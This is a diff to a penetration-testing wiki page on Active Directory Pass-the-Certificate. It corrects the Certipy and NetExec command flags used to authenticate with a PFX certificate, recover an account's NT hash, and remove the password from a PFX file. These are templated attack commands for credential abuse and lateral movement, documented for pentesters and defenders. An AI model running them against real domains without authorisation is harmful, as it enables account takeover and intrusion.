@@ -58,12 +58,12 @@ The ticket obtained can then be used to
 When using Certipy for Pass-the-Certificate, it automatically does [UnPAC-the-hash](/ad/movement/kerberos/unpac-the-hash) to recover the account's NT hash, in addition to saving the obtained TGT.
 
 ```bash
-certipy auth -pfx <PATH_TO_PFX_CERT> -dc-ip <DC_IP> -username <user> -domain <DOMAIN_FQDN>
+certipy auth -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -dc-ip <DC_IP> -username <user> -domain <DOMAIN_FQDN>
 ```
 
 <Callout type="info">
 
-Notes that Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.
+Older Certipy versions did not support password-protected PFXs (current Certipy accepts `-password` on `certipy auth`). Otherwise, the following command can "unprotect" a PFX file.
 
 ```bash
 certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out <unprotected.pfx>
@@ -94,10 +94,10 @@ openssl rsa -in <ENC_PEM_KEY> -out <FINAL_PEM_KEY>
 You can also use [Netexec](https://github.com/Pennyw0rth/NetExec) to perform Pass-the-Certificate authentication:
 
 ```bash
-netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" -u user 
-netexec <proto> <ip> --cert-pfx "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
-netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
-netexec <proto> <ip> --cert-pem "PATH_TO_CRT" --key-pem "PATH_TO_KEY" -u user
+netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" -u user
+netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user
+netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user
+netexec <proto> <ip> --pem-cert "PATH_TO_CRT" --pem-key "PATH_TO_KEY" -u user
 ```
 
 </Tab>
